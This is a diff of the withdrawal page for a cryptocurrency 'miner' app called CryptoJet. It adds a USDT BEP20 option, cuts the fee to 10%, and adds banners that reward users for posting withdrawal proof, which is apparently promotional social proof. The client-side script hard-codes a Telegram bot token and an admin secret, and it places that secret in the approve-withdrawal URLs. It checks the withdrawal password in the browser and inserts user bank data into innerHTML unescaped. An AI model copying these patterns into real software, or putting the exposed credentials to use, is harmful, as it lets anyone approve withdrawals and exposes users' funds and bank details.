@@ -4,36 +4,80 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Withdraw • CryptoJet</title>
-
 <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
-    :root { --green: #22c55e; --dark: #020617; }
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
     * { margin:0; padding:0; box-sizing:border-box; }
-    body { font-family: 'Inter', system-ui, sans-serif; background: #020617; color: #e2e8f0; min-height: 100vh; }
-    .header { padding: 20px 16px; display: flex; align-items: center; background: rgba(2,6,23,0.95); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(34,197,94,0.15); }
+    body { font-family:'Inter',sans-serif; background:#020617; color:#e2e8f0; min-height:100vh; }
+
+    .header { padding:20px 16px; display:flex; align-items:center; background:rgba(2,6,23,0.95); backdrop-filter:blur(12px); border-bottom:1px solid rgba(34,197,94,0.15); }
     .back { font-size:28px; color:#22c55e; cursor:pointer; }
     .header h3 { flex:1; text-align:center; font-size:20px; font-weight:600; }
-    .balance-box { background: #0f172a; margin: 16px; padding: 24px; border-radius: 24px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
-    .balance-label { font-size:14px; color:#64748b; }
-    .balance-amount { font-size:32px; font-weight:700; color:#22c55e; margin-top:6px; }
+
+    .balance-box { background:#0f172a; margin:16px; padding:24px; border-radius:24px; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.4); }
+    .balance-label { font-size:13px; color:#64748b; font-weight:600; text-transform:uppercase; letter-spacing:0.08em; }
+    .balance-amount { font-size:36px; font-weight:700; color:#22c55e; margin-top:6px; }
+
     .tabs { display:flex; background:#0f172a; border-radius:9999px; padding:6px; margin:0 16px 16px; }
-    .tab { flex:1; padding:14px; text-align:center; font-weight:600; border-radius:9999px; cursor:pointer; color:#94a3b8; }
+    .tab { flex:1; padding:14px; text-align:center; font-weight:600; border-radius:9999px; cursor:pointer; color:#94a3b8; transition:all 0.2s; }
     .tab.active { background:#22c55e; color:#022c22; box-shadow:0 4px 15px rgba(34,197,94,0.4); }
-    .content-wrapper { padding:0 16px 30px; }
-    .card { background:#0f172a; border-radius:24px; padding:28px 24px; box-shadow:0 10px 30px rgba(0,0,0,0.4); margin-bottom:20px; }
-    input, select { width:100%; padding:16px 18px; margin-top:12px; background:#1e2937; border:2px solid transparent; border-radius:16px; color:white; font-size:16px; }
-    input:focus, select:focus { border-color:#22c55e; box-shadow:0 0 0 4px rgba(34,197,94,0.2); outline:none; }
-    .saved-bank { background:#1e2937; border-radius:16px; padding:18px; margin-bottom:24px; }
-    .saved-bank .bank-name { color:#22c55e; font-weight:600; font-size:17px; }
-    .fee-info { font-size:14px; color:#94a3b8; margin:12px 0; text-align:center; }
-    .button { width:100%; padding:16px; margin-top:20px; background:#22c55e; color:#022c22; font-weight:700; font-size:17px; border:none; border-radius:16px; cursor:pointer; box-shadow:0 8px 25px rgba(34,197,94,0.3); }
-    .loader { position: fixed; inset: 0; background: rgba(2,6,23,0.92); display: none; align-items: center; justify-content: center; z-index: 99999; }
-    .spinner { width: 56px; height: 56px; border: 6px solid rgba(34,197,94,0.2); border-top: 6px solid #22c55e; border-radius: 50%; animation: spin 0.9s linear infinite; }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .toast { position:fixed; bottom:30px; left:50%; transform:translateX(-50%); background:#22c55e; color:#022c22; padding:14px 28px; border-radius:9999px; font-weight:600; box-shadow:0 10px 30px rgba(34,197,94,0.4); opacity:0; transition:all 0.3s; z-index:100000; }
+
+    .content-wrapper { padding:0 16px 40px; }
+    .card { background:#0f172a; border-radius:24px; padding:24px 22px; box-shadow:0 10px 30px rgba(0,0,0,0.4); margin-bottom:16px; }
+
+    input { width:100%; padding:15px 18px; margin-top:10px; background:#1e2937; border:2px solid transparent; border-radius:14px; color:white; font-size:15px; font-family:'Inter',sans-serif; transition:border-color 0.2s; }
+    input:focus { border-color:#22c55e; outline:none; box-shadow:0 0 0 3px rgba(34,197,94,0.15); }
+
+    .button { width:100%; padding:16px; background:#22c55e; color:#022c22; font-weight:700; font-size:16px; border:none; border-radius:16px; cursor:pointer; box-shadow:0 6px 20px rgba(34,197,94,0.3); transition:all 0.2s; margin-top:16px; }
+    .button:active { transform:scale(0.98); }
+
+    .saved-bank { background:#1e2937; border-radius:16px; padding:18px; margin-bottom:20px; }
+    .saved-bank .bank-name { color:#22c55e; font-weight:700; font-size:17px; margin-bottom:8px; }
+
+    .fee-box { background:rgba(34,197,94,0.07); border:1px solid rgba(34,197,94,0.15); border-radius:14px; padding:14px 16px; margin-top:12px; }
+    .fee-row { display:flex; justify-content:space-between; align-items:center; font-size:13px; color:#64748b; margin-bottom:6px; }
+    .fee-row:last-child { margin-bottom:0; padding-top:6px; border-top:1px solid rgba(255,255,255,0.05); }
+    .fee-row strong { color:#e2e8f0; }
+    .fee-row.receive strong { color:#22c55e; font-size:15px; }
+
+    .instructions-box { background:#0c1a2e; border:1px solid rgba(245,158,11,0.25); border-left:3px solid #f59e0b; border-radius:14px; padding:16px 18px; margin-bottom:16px; }
+    .inst-title { font-size:13px; font-weight:700; color:#f59e0b; margin-bottom:10px; }
+    .instructions-box ul { list-style:none; display:flex; flex-direction:column; gap:8px; }
+    .instructions-box li { font-size:13px; color:#94a3b8; line-height:1.55; display:flex; gap:8px; align-items:flex-start; }
+    .num { background:rgba(245,158,11,0.15); color:#f59e0b; font-size:10px; font-weight:800; min-width:18px; height:18px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0; margin-top:1px; }
+
     .weekend-notice { text-align:center; color:#f87171; font-size:15px; padding:20px; background:#1e2937; border-radius:16px; margin:16px; }
+
     .password-modal { position:fixed; inset:0; background:rgba(2,6,23,0.9); display:none; align-items:center; justify-content:center; z-index:10000; }
     .password-box { background:#0f172a; width:90%; max-width:380px; border-radius:24px; padding:28px; text-align:center; }
+
+    /* USDT card */
+    .usdt-card {
+        background:linear-gradient(135deg,#0a1e2e,#0f172a);
+        border:1px solid rgba(240,185,11,0.25);
+        border-radius:20px; padding:22px;
+        margin-bottom:16px;
+    }
+    .usdt-header { display:flex; align-items:center; gap:14px; margin-bottom:16px; }
+    .bep-logo { width:46px; height:46px; border-radius:13px; background:linear-gradient(135deg,#f0b90b,#f8d06b); display:flex; align-items:center; justify-content:center; font-weight:800; font-size:13px; color:#000; flex-shrink:0; }
+    .usdt-benefits { display:flex; flex-direction:column; gap:6px; margin-bottom:14px; }
+    .usdt-benefit { font-size:13px; color:#94a3b8; display:flex; gap:8px; }
+    .usdt-benefit::before { content:'✓'; color:#22c55e; font-weight:700; flex-shrink:0; }
+    .net-fee-row { background:#1e2937; border-radius:10px; padding:9px 14px; font-size:13px; color:#64748b; display:flex; justify-content:space-between; }
+    .net-fee-row strong { color:#e2e8f0; }
+
+    .community-bonus { background:linear-gradient(135deg,rgba(168,85,247,0.08),rgba(59,130,246,0.08)); border:1px solid rgba(168,85,247,0.2); border-radius:14px; padding:14px 16px; margin-bottom:16px; display:flex; gap:12px; align-items:flex-start; }
+    .bonus-icon { font-size:22px; flex-shrink:0; margin-top:2px; }
+    .bonus-text { font-size:13px; color:#94a3b8; line-height:1.55; }
+    .bonus-text strong { color:#c084fc; }
+
+    .wallet-label { font-size:13px; font-weight:600; color:#e2e8f0; margin-top:16px; margin-bottom:2px; }
+    .wallet-hint  { font-size:11px; color:#475569; margin-bottom:2px; }
+
+    .loader { position:fixed; inset:0; background:rgba(2,6,23,0.95); display:none; align-items:center; justify-content:center; z-index:99999; }
+    .spinner { width:64px; height:64px; border:6px solid rgba(34,197,94,0.15); border-top:6px solid #22c55e; border-radius:50%; animation:spin 0.9s linear infinite; }
+    @keyframes spin { to{ transform:rotate(360deg); } }
+
+    .toast { position:fixed; bottom:30px; left:50%; transform:translateX(-50%); background:#22c55e; color:#022c22; padding:13px 26px; border-radius:999px; font-weight:700; font-size:14px; box-shadow:0 8px 25px rgba(34,197,94,0.4); opacity:0; transition:all 0.3s; z-index:100000; white-space:nowrap; pointer-events:none; }
 </style>
 </head>
 <body>
@@ -44,13 +88,13 @@
 </div>
 
 <div class="balance-box">
-    <div class="balance-label">AVAILABLE BALANCE</div>
+    <div class="balance-label">Available Balance</div>
     <div class="balance-amount" id="balance">$0.00</div>
 </div>
 
 <div class="tabs">
-    <div class="tab active" id="tab-bank" onclick="switchTab('bank')">Bank Transfer</div>
-    <div class="tab" id="tab-usdt" onclick="switchTab('usdt')">USDT</div>
+    <div class="tab active" id="tab-bank" onclick="switchTab('bank')">🏦 Bank Transfer</div>
+    <div class="tab"        id="tab-usdt" onclick="switchTab('usdt')">💎 USDT</div>
 </div>
 
 <div id="content" class="content-wrapper"></div>
@@ -62,7 +106,7 @@
         <h3 style="margin-bottom:20px;">Enter Withdrawal Password</h3>
         <input id="withdrawPass" type="password" placeholder="Withdrawal Password" style="margin-bottom:20px;">
         <button onclick="verifyPassword()" class="button" style="margin-bottom:12px;">Confirm</button>
-        <button onclick="hidePasswordModal()" style="background:#334155;color:white;width:100%;padding:14px;border-radius:16px;">Cancel</button>
+        <button onclick="hidePasswordModal()" style="background:#334155;color:white;width:100%;padding:14px;border-radius:16px;border:none;cursor:pointer;">Cancel</button>
     </div>
 </div>
 
@@ -70,13 +114,12 @@
 
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-
 <script>
 const firebaseConfig = {
-  apiKey: "AIzaSyC6FpkoVyWoDxnzSqC39X8_pqwoEyc7tvw",
-  authDomain: "cj-miner.firebaseapp.com",
-  databaseURL: "https://cj-miner-default-rtdb.europe-west1.firebasedatabase.app",
-  projectId: "cj-miner"
+    apiKey: "AIzaSyC6FpkoVyWoDxnzSqC39X8_pqwoEyc7tvw",
+    authDomain: "cj-miner.firebaseapp.com",
+    databaseURL: "https://cj-miner-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "cj-miner"
 };
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
@@ -85,184 +128,317 @@ const uid = localStorage.getItem("uid");
 if (!uid) { alert("Please sign in first"); window.location.href = "signin.html"; }
 
 const FUNCTIONS_BASE = "https://europe-west1-cj-miner.cloudfunctions.net";
-const SECRET = "cryptojet_secret_2024";
-const BOT_TOKEN = "8688577357:AAHt9nAPIESkZiDZFDGRmyaJmzxogrpY3PY";
-const ADMIN_CHAT_ID = 8632260150;
+const SECRET         = "cryptojet_secret_2024";
+const BOT_TOKEN      = "8688577357:AAHt9nAPIESkZiDZFDGRmyaJmzxogrpY3PY";
+const ADMIN_CHAT_ID  = 8632260150;
+const FEE_PERCENT    = 0.10;
 
-let currentBalance = 0;
-let savedBank = null;
+let currentBalance     = 0;
+let savedBank          = null;
 let withdrawalPassword = null;
-let pendingAmount = 0;
-let pendingMethod = "";
+let pendingAmount      = 0;
+let currentTab         = "bank";
 
 db.ref("users/" + uid).on("value", snap => {
     const d = snap.val() || {};
-    currentBalance    = d.balance || 0;
-    savedBank         = d.bank ? { bank: d.bank, name: d.name, number: d.number } : null;
+    currentBalance     = d.balance || 0;
+    savedBank          = d.bank ? { bank:d.bank, name:d.name, number:d.number } : null;
     withdrawalPassword = d.withdrawalPassword || null;
-    document.getElementById("balance").innerText = "$" + currentBalance.toFixed(2);
+    document.getElementById("balance").textContent = "$" + currentBalance.toFixed(2);
     renderCurrentTab();
 });
 
 function switchTab(tab) {
+    currentTab = tab;
     document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
-    if (tab === "bank") document.getElementById("tab-bank").classList.add("active");
-    else document.getElementById("tab-usdt").classList.add("active");
+    document.getElementById("tab-" + tab).classList.add("active");
     renderCurrentTab();
 }
 
 function renderCurrentTab() {
-    const content = document.getElementById("content");
-    const isBank  = document.querySelector(".tab.active").id.includes("bank");
-    const today   = new Date().getDay();
-    if (today === 0 || today === 6) {
-        content.innerHTML = `<div class="weekend-notice"><strong>Withdrawal is only available Monday to Friday.</strong><br>Please come back on a weekday.</div>`;
-        return;
-    }
-    if (isBank) {
-        content.innerHTML = `
-        <div class="card">
-            <h3 style="margin-bottom:20px;font-size:20px;font-weight:600;">Bank Withdrawal</h3>
-            ${savedBank ? `
-            <div class="saved-bank">
-                <div class="bank-name">${savedBank.bank || 'Bank'}</div>
-                <p style="margin:8px 0 4px"><strong>Account Name:</strong> ${savedBank.name || '—'}</p>
-                <p><strong>Account Number:</strong> ${savedBank.number || '—'}</p>
-                <button onclick="goToBankSettings()" style="margin-top:16px;background:#334155;color:white;width:100%;padding:12px;border-radius:12px;">Edit Bank Details</button>
-            </div>` : `
-            <p style="color:#f87171;text-align:center;padding:20px;">No bank account saved yet.<br><a href="bank.html" style="color:#22c55e">Go to Bank Settings →</a></p>`}
-            <input id="amountBank" type="number" placeholder="Withdrawal amount" style="margin-top:20px;">
-            <div id="feeInfo" class="fee-info"></div>
-            <button onclick="startWithdraw('bank')" class="button">Request Withdrawal</button>
-            <p style="text-align:center;font-size:13px;color:#64748b;margin-top:12px;">Processing time: 5–30 minutes • Mon–Fri only</p>
-        </div>`;
-    } else {
-        content.innerHTML = `
-        <div class="card">
-            <h3 style="margin-bottom:20px;font-size:20px;font-weight:600;">USDT Withdrawal</h3>
-            <p style="text-align:center;color:#f87171;padding:40px 20px;">Coming Soon</p>
-        </div>`;
-    }
-    const amountInput = document.getElementById("amountBank");
-    const feeDiv      = document.getElementById("feeInfo");
-    if (amountInput) {
-        amountInput.addEventListener("input", () => {
-            const amt     = parseFloat(amountInput.value) || 0;
-            const charge  = amt * 0.18;
-            const receive = amt - charge;
-            feeDiv.innerHTML = `18% charge: <strong>$${charge.toFixed(2)}</strong><br>You will receive: <strong>$${receive.toFixed(2)}</strong>`;
-        });
-    }
+    if (currentTab === "bank") renderBank();
+    else renderUSDT();
 }
 
-function goToBankSettings() { window.location.href = "bank.html"; }
+// ════════════════════════════════════════════════════════════════
+// BANK WITHDRAWAL
+// ════════════════════════════════════════════════════════════════
+function renderBank() {
+    const c   = document.getElementById("content");
+    const day = new Date().getDay();
+    if (day === 0 || day === 6) {
+        c.innerHTML = `<div class="weekend-notice"><strong>⏸ Withdrawals are only processed Monday – Friday.</strong><br>Please come back on a weekday.</div>`;
+        return;
+    }
 
-function startWithdraw(method) {
-    const amount = parseFloat(document.getElementById("amountBank").value);
-    if (!amount || amount <= 0) return toast("Enter a valid amount");
-    if (amount > currentBalance)  return toast("Insufficient balance");
-    pendingAmount = amount;
-    pendingMethod = method;
+    c.innerHTML = `
+    <div class="community-bonus">
+        <div class="bonus-icon">🏅</div>
+        <div class="bonus-text">
+            <strong>Boost your priority!</strong> Sharing your withdrawal proof in the CryptoJet community feed raises your Miner Trust Score and moves your next withdrawal to the front of the queue.
+        </div>
+    </div>
+
+    <div class="instructions-box">
+        <div class="inst-title">⚠️ Bank Withdrawal Rules</div>
+        <ul>
+            <li><span class="num">1</span>Withdrawals are processed within <strong>48 hours</strong> of request — plan accordingly</li>
+            <li><span class="num">2</span>Share your withdrawal proof in the community feed to boost your Miner Trust Score and get priority processing on future withdrawals</li>
+            <li><span class="num">3</span>Ensure your saved bank details are correct before submitting — wrong account numbers cannot be reversed</li>
+            <li><span class="num">4</span>A <strong>10% processing fee</strong> is deducted — the amount shown is exactly what lands in your account</li>
+            <li><span class="num">5</span>Minimum withdrawal amount is <strong>$10</strong> — requests below this will be declined automatically</li>
+            <li><span class="num">6</span>Do not submit duplicate withdrawal requests — it delays processing for everyone and may result in a temporary hold on your account</li>
+        </ul>
+    </div>
+
+    <div class="card">
+        <h3 style="font-size:18px;font-weight:700;margin-bottom:16px;">Bank Withdrawal</h3>
+
+        ${savedBank ? `
+        <div class="saved-bank">
+            <div class="bank-name">${savedBank.bank}</div>
+            <p style="font-size:14px;color:#94a3b8;margin-bottom:4px;"><strong style="color:#e2e8f0">Name:</strong> ${savedBank.name}</p>
+            <p style="font-size:14px;color:#94a3b8;"><strong style="color:#e2e8f0">Account:</strong> ${savedBank.number}</p>
+            <button onclick="window.location.href='bank.html'" style="margin-top:14px;background:#334155;color:white;width:100%;padding:11px;border-radius:12px;border:none;cursor:pointer;font-size:14px;">Edit Bank Details</button>
+        </div>` : `
+        <p style="color:#f87171;text-align:center;padding:20px;font-size:14px;">No bank account saved.<br><a href="bank.html" style="color:#22c55e">Go to Bank Settings →</a></p>`}
+
+        <input id="bankAmount" type="number" placeholder="Enter withdrawal amount in USD">
+        <div id="bankFeeBox" style="display:none" class="fee-box">
+            <div class="fee-row"><span>Amount requested</span><strong id="feeReq">$0</strong></div>
+            <div class="fee-row"><span>Processing fee (10%)</span><strong id="feeCharge" style="color:#f87171">-$0</strong></div>
+            <div class="fee-row receive"><span>You will receive</span><strong id="feeRecv">$0</strong></div>
+        </div>
+
+        <button onclick="startBankWithdraw()" class="button">Request Withdrawal</button>
+        <p style="text-align:center;font-size:12px;color:#475569;margin-top:10px;">Processing: up to 48 hours • Mon–Fri only</p>
+    </div>`;
+
+    document.getElementById("bankAmount").addEventListener("input", e => {
+        const amt = parseFloat(e.target.value) || 0;
+        const box = document.getElementById("bankFeeBox");
+        if (amt > 0) {
+            box.style.display = "block";
+            document.getElementById("feeReq").textContent    = "$" + amt.toFixed(2);
+            document.getElementById("feeCharge").textContent = "-$" + (amt * FEE_PERCENT).toFixed(2);
+            document.getElementById("feeRecv").textContent   = "$" + (amt - amt * FEE_PERCENT).toFixed(2);
+        } else { box.style.display = "none"; }
+    });
+}
+
+function startBankWithdraw() {
+    const amount = parseFloat(document.getElementById("bankAmount").value);
+    if (!amount || amount < 10)  return toast("Minimum withdrawal is $10");
+    if (amount > currentBalance) return toast("Insufficient balance");
+    if (!savedBank)              return toast("Please set your bank details first");
     if (!withdrawalPassword) {
-        toast("You need to set a withdrawal password first");
+        toast("Please set a withdrawal password first");
         setTimeout(() => window.location.href = "bank.html", 1800);
         return;
     }
+    pendingAmount = amount;
+    window._withdrawType = "bank";
     document.getElementById("passwordModal").style.display = "flex";
     document.getElementById("withdrawPass").focus();
 }
 
-function verifyPassword() {
-    const entered = document.getElementById("withdrawPass").value.trim();
-    if (entered === withdrawalPassword) { hidePasswordModal(); proceedWithWithdrawal(); }
-    else { toast("Incorrect withdrawal password"); document.getElementById("withdrawPass").value = ""; }
+// ════════════════════════════════════════════════════════════════
+// USDT WITHDRAWAL — BEP20 ONLY
+// ════════════════════════════════════════════════════════════════
+function renderUSDT() {
+    const c = document.getElementById("content");
+    c.innerHTML = `
+    <div class="community-bonus">
+        <div class="bonus-icon">🏅</div>
+        <div class="bonus-text">
+            <strong>Earn priority status!</strong> Miners who post their USDT withdrawal proof in the community feed consistently get their next withdrawal processed first. Build your trust score — it pays off.
+        </div>
+    </div>
+
+    <div class="instructions-box">
+        <div class="inst-title">⚠️ USDT BEP20 Withdrawal Rules</div>
+        <ul>
+            <li><span class="num">1</span>USDT is sent automatically on the <strong style="color:#f0b90b">BEP20 (BSC)</strong> network — arrives within minutes of approval</li>
+            <li><span class="num">2</span>Double-check your wallet address — wrong addresses result in permanent loss of funds with no recovery possible</li>
+            <li><span class="num">3</span>Your wallet <strong>must support BEP20</strong> — compatible with MetaMask, Trust Wallet, Binance and most major wallets</li>
+            <li><span class="num">4</span>A <strong>10% processing fee</strong> is deducted — the amount shown is exactly what arrives in your wallet</li>
+            <li><span class="num">5</span>Minimum withdrawal is <strong>$10 USDT</strong></li>
+            <li><span class="num">6</span>Share your withdrawal proof in the community to boost your Miner Trust Score and unlock priority processing</li>
+        </ul>
+    </div>
+
+    <div class="usdt-card">
+        <div class="usdt-header">
+            <div class="bep-logo">BNB</div>
+            <div>
+                <div style="font-size:16px;font-weight:700;">BEP20 (BSC) Network</div>
+                <div style="font-size:12px;color:#64748b;">Binance Smart Chain • USDT</div>
+            </div>
+        </div>
+        <div class="usdt-benefits">
+            <div class="usdt-benefit">Sent automatically — no waiting for manual transfer</div>
+            <div class="usdt-benefit">Low network fees — usually under $0.20</div>
+            <div class="usdt-benefit">Arrives in your wallet within minutes of approval</div>
+            <div class="usdt-benefit">Compatible with MetaMask, Trust Wallet & Binance</div>
+        </div>
+        <div class="net-fee-row"><span>Network fee</span><strong>~$0.10 – $0.20</strong></div>
+    </div>
+
+    <div class="card">
+        <div class="wallet-label">Your BEP20 Wallet Address</div>
+        <div class="wallet-hint">Must be a BSC (BEP20) compatible address starting with 0x</div>
+        <input id="usdtAddress" type="text" placeholder="0x... paste your BEP20 wallet address">
+
+        <input id="usdtAmount" type="number" placeholder="Amount to withdraw in USD" style="margin-top:14px;">
+        <div id="usdtFeeBox" style="display:none" class="fee-box">
+            <div class="fee-row"><span>Amount requested</span><strong id="uFeeReq">$0</strong></div>
+            <div class="fee-row"><span>Processing fee (10%)</span><strong id="uFeeCharge" style="color:#f87171">-$0</strong></div>
+            <div class="fee-row receive"><span>You will receive</span><strong id="uFeeRecv">$0</strong></div>
+        </div>
+
+        <button onclick="startUSDTWithdraw()" class="button">Request USDT Withdrawal</button>
+        <p style="text-align:center;font-size:12px;color:#475569;margin-top:10px;">Sent automatically on approval • BEP20 only</p>
+    </div>`;
+
+    document.getElementById("usdtAmount").addEventListener("input", e => {
+        const amt = parseFloat(e.target.value) || 0;
+        const box = document.getElementById("usdtFeeBox");
+        if (amt > 0) {
+            box.style.display = "block";
+            document.getElementById("uFeeReq").textContent    = "$" + amt.toFixed(2);
+            document.getElementById("uFeeCharge").textContent = "-$" + (amt * FEE_PERCENT).toFixed(2);
+            document.getElementById("uFeeRecv").textContent   = "$" + (amt - amt * FEE_PERCENT).toFixed(2);
+        } else { box.style.display = "none"; }
+    });
 }
 
+function startUSDTWithdraw() {
+    const address = document.getElementById("usdtAddress").value.trim();
+    const amount  = parseFloat(document.getElementById("usdtAmount").value);
+
+    if (!address || !address.startsWith("0x") || address.length < 40)
+        return toast("Please enter a valid BEP20 wallet address");
+    if (!amount || amount < 10)  return toast("Minimum withdrawal is $10");
+    if (amount > currentBalance) return toast("Insufficient balance");
+    if (!withdrawalPassword) {
+        toast("Please set a withdrawal password first");
+        setTimeout(() => window.location.href = "bank.html", 1800);
+        return;
+    }
+    pendingAmount = amount;
+    window._withdrawType = "usdt";
+    window._usdtAddress  = address;
+    document.getElementById("passwordModal").style.display = "flex";
+    document.getElementById("withdrawPass").focus();
+}
+
+// ── PASSWORD VERIFY ───────────────────────────────────────────
+function verifyPassword() {
+    const entered = document.getElementById("withdrawPass").value.trim();
+    if (entered !== withdrawalPassword) {
+        toast("Incorrect withdrawal password");
+        document.getElementById("withdrawPass").value = "";
+        return;
+    }
+    hidePasswordModal();
+    if (window._withdrawType === "usdt") proceedUSDTWithdraw();
+    else proceedBankWithdraw();
+}
 function hidePasswordModal() {
     document.getElementById("passwordModal").style.display = "none";
     document.getElementById("withdrawPass").value = "";
 }
 
-async function proceedWithWithdrawal() {
-    const loader  = document.getElementById("loader");
-    loader.style.display = "flex";
-
-    const charge      = pendingAmount * 0.18;
+// ── BANK PROCEED ──────────────────────────────────────────────
+async function proceedBankWithdraw() {
+    document.getElementById("loader").style.display = "flex";
+    const charge      = pendingAmount * FEE_PERCENT;
     const finalAmount = pendingAmount - charge;
+    const minerId     = await getMinerId();
 
-    const txData = {
-        uid,
-        type:        "withdraw",
-        method:      "bank",
-        amount:      pendingAmount,
-        charge,
-        finalAmount,
-        status:      "pending",
-        date:        Date.now(),
-        ...(savedBank || {})
-    };
-
-    // ── Write to BOTH paths ──────────────────────────────────────────
-    // 1. Main transactions node (for admin Cloud Functions)
-    const txRef = db.ref("transactions").push();
+    const txData = { uid, type:"withdraw", method:"bank", amount:pendingAmount, charge, finalAmount, status:"pending", date:Date.now(), ...savedBank };
+    const txRef  = db.ref("transactions").push();
     await txRef.set(txData);
-
-    // 2. User-specific node (for fast history loading)
-    await db.ref("userTransactions/" + uid + "/" + txRef.key).set({
-        uid,
-        type:   "withdraw",
-        method: "bank",
-        amount: pendingAmount,
-        status: "pending",
-        date:   Date.now()
-    });
-    // ────────────────────────────────────────────────────────────────
+    await db.ref("userTransactions/" + uid + "/" + txRef.key).set({ uid, type:"withdraw", method:"bank", amount:pendingAmount, status:"pending", date:Date.now() });
 
     const approveUrl = `${FUNCTIONS_BASE}/approveWithdraw?txId=${txRef.key}&secret=${SECRET}`;
     const rejectUrl  = `${FUNCTIONS_BASE}/rejectWithdraw?txId=${txRef.key}&secret=${SECRET}`;
 
-    const minerId = await getMinerId();
-    const caption =
-`🔥 Withdrawal Request
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method:"POST", headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:
+`🏦 Bank Withdrawal Request
 ──────────────────
 👤 User: ${uid}
 🆔 Miner ID: ${minerId}
 💰 Amount: $${pendingAmount.toFixed(2)}
-📉 Fee (18%): $${charge.toFixed(2)}
+📉 Fee (10%): $${charge.toFixed(2)}
 ✅ To Send: $${finalAmount.toFixed(2)}
-🏦 Bank: ${savedBank ? savedBank.bank : 'N/A'}
-📋 Account: ${savedBank ? savedBank.number : 'N/A'}
-👤 Name: ${savedBank ? savedBank.name : 'N/A'}
-🔑 Tx ID: ${txRef.key}`;
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: ADMIN_CHAT_ID,
-            text: caption,
-            reply_markup: { inline_keyboard: [[
-                { text: "✅ Approve", url: approveUrl },
-                { text: "❌ Reject",  url: rejectUrl  }
-            ]]}
-        })
+🏦 Bank: ${savedBank.bank}
+📋 Account: ${savedBank.number}
+👤 Name: ${savedBank.name}
+🔑 Tx ID: ${txRef.key}`,
+        reply_markup:{ inline_keyboard:[[
+            { text:"✅ Approve", url:approveUrl },
+            { text:"❌ Reject",  url:rejectUrl  }
+        ]]}})
     });
 
-    loader.style.display = "none";
-    toast("Withdraw is under processing • Sent to Financial Department");
-    setTimeout(() => renderCurrentTab(), 1800);
+    document.getElementById("loader").style.display = "none";
+    toast("Withdrawal submitted • Processing within 48 hours");
+    setTimeout(() => renderCurrentTab(), 2000);
+}
+
+// ── USDT PROCEED ──────────────────────────────────────────────
+async function proceedUSDTWithdraw() {
+    document.getElementById("loader").style.display = "flex";
+    const address     = window._usdtAddress;
+    const charge      = pendingAmount * FEE_PERCENT;
+    const finalAmount = pendingAmount - charge;
+    const minerId     = await getMinerId();
+
+    const txData = { uid, type:"withdraw", method:"bep20", amount:pendingAmount, charge, finalAmount, status:"pending", date:Date.now(), walletAddress:address };
+    const txRef  = db.ref("transactions").push();
+    await txRef.set(txData);
+    await db.ref("userTransactions/" + uid + "/" + txRef.key).set({ uid, type:"withdraw", method:"bep20", amount:pendingAmount, status:"pending", date:Date.now() });
+
+    const approveUrl = `${FUNCTIONS_BASE}/approveUSDTWithdraw?txId=${txRef.key}&secret=${SECRET}`;
+    const rejectUrl  = `${FUNCTIONS_BASE}/rejectWithdraw?txId=${txRef.key}&secret=${SECRET}`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method:"POST", headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:
+`💎 USDT Withdrawal Request
+──────────────────
+👤 User: ${uid}
+🆔 Miner ID: ${minerId}
+💰 Amount: $${pendingAmount.toFixed(2)}
+📉 Fee (10%): $${charge.toFixed(2)}
+✅ To Send: $${finalAmount.toFixed(2)} USDT
+🌐 Network: BEP20 (BSC)
+📋 Address: ${address}
+🔑 Tx ID: ${txRef.key}`,
+        reply_markup:{ inline_keyboard:[[
+            { text:"✅ Approve & Send USDT", url:approveUrl },
+            { text:"❌ Reject",              url:rejectUrl  }
+        ]]}})
+    });
+
+    document.getElementById("loader").style.display = "none";
+    toast("USDT withdrawal submitted • Sent automatically on approval");
+    window._usdtAddress = null;
+    setTimeout(() => renderCurrentTab(), 2000);
 }
 
 async function getMinerId() {
     return new Promise(resolve => {
-        db.ref("users/" + uid).once("value", snap => resolve((snap.val() || {}).minerId || "N/A"));
+        db.ref("users/" + uid).once("value", snap => resolve((snap.val()||{}).minerId||"N/A"));
     });
 }
 
 function toast(msg) {
     const t = document.getElementById("toast");
-    t.innerText = msg;
-    t.style.opacity = 1;
+    t.textContent = msg; t.style.opacity = 1;
     setTimeout(() => t.style.opacity = 0, 3000);
 }
 </script>
